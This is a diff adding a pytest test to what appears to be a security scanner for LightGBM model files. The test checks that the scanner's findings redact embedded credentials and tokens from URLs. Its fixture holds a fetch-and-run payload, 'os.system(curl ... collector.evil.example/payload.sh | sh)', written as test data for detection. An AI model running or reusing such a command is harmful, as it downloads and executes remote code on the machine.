@@ -113,6 +113,31 @@ def test_scan_detects_command_and_network_correlation(tmp_path: Path) -> None:
     assert correlation_checks[0].severity == IssueSeverity.CRITICAL
 
 
+def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
+    path = tmp_path / "network_secret.model"
+    path.write_text(
+        _build_lightgbm_text(
+            [
+                (
+                    "metadata=os.system('curl "
+                    "https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag | sh')"
+                ),
+                "callback_url=https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    assert "https://collector.evil.example/payload.sh" in failed_details
+    assert "lgb_user" not in failed_details
+    assert "lgb_pass" not in failed_details
+    assert "LGB_SECRET" not in failed_details
+    assert "#frag" not in failed_details
+
+
 def test_scan_corrupt_file_fails_signature_validation(tmp_path: Path) -> None:
     path = tmp_path / "corrupt.lgb"
     path.write_bytes(b"\x00\xff\x10\x00not-a-lightgbm-model")
